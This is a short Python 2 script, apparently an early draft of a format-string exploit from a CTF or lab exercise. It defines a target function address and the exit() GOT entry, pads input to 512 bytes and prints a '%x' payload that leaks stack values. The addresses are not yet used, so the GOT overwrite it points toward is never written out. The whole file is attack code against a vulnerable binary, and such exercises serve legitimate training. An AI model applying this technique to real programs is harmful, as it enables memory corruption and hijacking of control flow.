FT_O =			0x80484a4
EXIT_GOT=		0x8049838

def pad(s):
    return s+"X"*(512-len(s))

exploit=""
exploit+= "%x " * 4

print pad(exploit)
